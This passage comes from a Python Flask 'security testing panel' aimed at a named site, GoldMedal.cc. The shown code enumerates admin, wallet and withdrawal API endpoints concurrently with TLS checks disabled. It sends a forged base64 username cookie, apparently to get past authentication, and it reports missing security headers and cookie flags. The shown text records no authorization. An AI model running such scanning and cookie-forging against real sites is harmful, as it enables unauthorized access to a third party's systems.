        'api/profit', 'api/profit/list', 'api/profit/withdraw',
        'api/income', 'api/income/list', 'api/income/stats',
        
        # Activity & News
        'api/activity', 'api/activity/list', 'api/activity/join',
        'api/news', 'api/news/list', 'api/news/detail',
        'api/notice', 'api/notice/list', 'api/notice/detail',
        'api/help', 'api/help/list', 'api/help/detail',
        'api/article', 'api/article/list', 'api/article/detail',
        
        # Admin Endpoints
        'api/admin', 'api/admin/login', 'api/admin/users',
        'api/admin/stats', 'api/admin/dashboard',
        'api/admin/settings', 'api/admin/config',
        'api/admin/recharges', 'api/admin/withdrawals',
        'api/admin/orders', 'api/admin/transactions',
        'api/admin/system', 'api/admin/logs',
        
        # Config & System
        'api/config', 'api/settings', 'api/version',
        'api/health', 'api/ping', 'api/status',
        'api/time', 'api/server_info',
        
        # File Upload
        'api/upload', 'api/upload/image', 'api/upload/file',
        'api/file', 'api/file/download',
        
        # Direct module/controller
        'user/login', 'user/register', 'user/info', 'user/profile',
        'user/AddTikuan', 'user/Tikuanmanage', 'user/wallet',
        'user/recharge', 'user/withdraw', 'user/transfer',
        'admin/index', 'admin/login', 'admin/users',
        'admin/settings', 'admin/system',
        'index/index', 'home/index', 'api/index',
    ]
    
    results = []
    session = get_session()
    
    def test_endpoint(endpoint):
        try:
            # Test GET
            url = f"{base_url}?s={endpoint}"
            r = session.get(url, timeout=10, verify=False,
                          headers={'Cookie': 'username=TWFydWZiZWxheQ=='})
            
            if r.status_code != 404 and 'module not exists' not in r.text.lower():
                # Analyze response
                has_json = r.headers.get('Content-Type', '').startswith('application/json')
                has_data = len(r.text) > 50
                
                return {
                    'endpoint': endpoint,
                    'method': 'GET',
                    'status': r.status_code,
                    'length': len(r.text),
                    'is_json': has_json,
                    'has_data': has_data,
                    'snippet': r.text[:300]
                }
            
            # Test POST
            r = session.post(url, timeout=10, verify=False,
                           json={"test": 1},
                           headers={
                               'Content-Type': 'application/json',
                               'Cookie': 'username=TWFydWZiZWxheQ=='
                           })
            
            if r.status_code != 404 and 'module not exists' not in r.text.lower():
                return {
                    'endpoint': endpoint,
                    'method': 'POST',
                    'status': r.status_code,
                    'length': len(r.text),
                    'is_json': r.headers.get('Content-Type', '').startswith('application/json'),
                    'has_data': len(r.text) > 50,
                    'snippet': r.text[:300]
                }
        except:
            pass
        return None
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_endpoint, endpoint) for endpoint in endpoints]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    
    return jsonify(results)

# ============================================================
# SECURITY HEADERS CHECK - Enhanced
# ============================================================
@app.route('/hunt/headers')
def check_headers():
    """Enhanced security headers analysis"""
    try:
        r = requests.get(f"{TARGET}/", timeout=10, verify=False)
        
        security_headers = {
            'X-Frame-Options': r.headers.get('X-Frame-Options', 'MISSING'),
            'X-Content-Type-Options': r.headers.get('X-Content-Type-Options', 'MISSING'),
            'Content-Security-Policy': r.headers.get('Content-Security-Policy', 'MISSING'),
            'X-XSS-Protection': r.headers.get('X-XSS-Protection', 'MISSING'),
            'Strict-Transport-Security': r.headers.get('Strict-Transport-Security', 'MISSING'),
            'Referrer-Policy': r.headers.get('Referrer-Policy', 'MISSING'),
            'Permissions-Policy': r.headers.get('Permissions-Policy', 'MISSING'),
            'Feature-Policy': r.headers.get('Feature-Policy', 'MISSING'),
            'Server': r.headers.get('Server', 'MISSING'),
            'X-Powered-By': r.headers.get('X-Powered-By', 'MISSING'),
            'X-AspNet-Version': r.headers.get('X-AspNet-Version', 'MISSING'),
            'X-AspNetMvc-Version': r.headers.get('X-AspNetMvc-Version', 'MISSING'),
        }
        
        # Analyze vulnerabilities
        vulnerabilities = []
        severity_map = {
            'X-Frame-Options': ('Clickjacking possible', 'MEDIUM'),
            'Content-Security-Policy': ('XSS risk increased', 'HIGH'),
            'Strict-Transport-Security': ('SSL stripping possible', 'MEDIUM'),
            'X-Content-Type-Options': ('MIME sniffing possible', 'LOW'),
            'X-XSS-Protection': ('XSS filter not enforced', 'MEDIUM'),
            'Referrer-Policy': ('Referrer leakage possible', 'LOW'),
            'Permissions-Policy': ('Feature abuse possible', 'LOW'),
        }
        
        for header, (description, severity) in severity_map.items():
            if security_headers[header] == 'MISSING':
                vulnerabilities.append({
                    'header': header,
                    'issue': description,
                    'severity': severity
                })
        
        # Server info disclosure
        if security_headers['Server'] != 'MISSING':
            vulnerabilities.append({
                'header': 'Server',
                'issue': f'Server info exposed: {security_headers["Server"]}',
                'severity': 'LOW'
            })
        
        if security_headers['X-Powered-By'] != 'MISSING':
            vulnerabilities.append({
                'header': 'X-Powered-By',
                'issue': f'Technology info exposed: {security_headers["X-Powered-By"]}',
                'severity': 'LOW'
            })
        
        # Check cookies
        cookies_info = []
        for cookie in r.cookies:
            cookie_info = {
                'name': cookie.name,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('httponly'),
                'samesite': cookie.has_nonstandard_attr('samesite'),
            }
            cookies_info.append(cookie_info)
            
            if not cookie.secure:
                vulnerabilities.append({
                    'header': f'Cookie: {cookie.name}',
                    'issue': 'Cookie missing Secure flag',
                    'severity': 'MEDIUM'
                })
            if not cookie.has_nonstandard_attr('httponly'):
                vulnerabilities.append({
                    'header': f'Cookie: {cookie.name}',
                    'issue': 'Cookie missing HttpOnly flag',
                    'severity': 'MEDIUM'
                })
        
        return jsonify({
            'headers': security_headers,
            'cookies': cookies_info,
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities),
            'all_headers': dict(r.headers)
        })
    except Exception as e:
        return jsonify({'error': str(e)})

# ============================================================
# HEALTH CHECK
# ============================================================
@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'target': TARGET,
        'cache_size': len(cache)
    })

# ============================================================
# CLEAR CACHE
# ============================================================
@app.route('/clear-cache')
def clear_cache():
    cache.clear()
    return jsonify({'message': 'Cache cleared', 'timestamp': datetime.now().isoformat()})

# ============================================================
# STARTUP
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f"""
╔══════════════════════════════════════════════╗
║   🔬 GoldMedal.cc Security Testing Panel    ║
║   Running on port {port}                      ║
║   Target: {TARGET}                ║
║   ⚠️  Ethical Testing Only                   ║
╚══════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False)
